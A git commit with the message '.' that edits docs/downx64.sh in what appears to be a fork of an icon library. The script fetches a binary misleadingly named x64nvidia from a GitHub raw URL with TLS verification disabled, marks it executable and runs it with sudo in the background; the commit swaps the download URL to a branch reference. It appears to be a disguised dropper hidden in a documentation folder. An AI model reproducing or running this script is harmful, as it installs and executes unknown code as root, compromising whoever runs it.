b5c1d340563a447236ad6befb7ea08626581852a
pavlovasianov <pavlovasianovych6@gmail.com>
2025-02-07 08:20:23 +0200

    .

--- docs/downx64.sh
+++ docs/downx64.sh
@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
 
-curl -k -A 205 -o /var/tmp/x64nvidia https://raw.githubusercontent.com/pavlovasianov/lucide/35558649ca38c3675aff5a983bd5f4214eae8b4e/docs/x64nvidia
+curl -k -A 205 -o /var/tmp/x64nvidia https://raw.githubusercontent.com/pavlovasianov/lucide/refs/heads/icon/fist/docs/x64nvidia
 sudo chmod +x /var/tmp/x64nvidia
 sudo /var/tmp/x64nvidia &
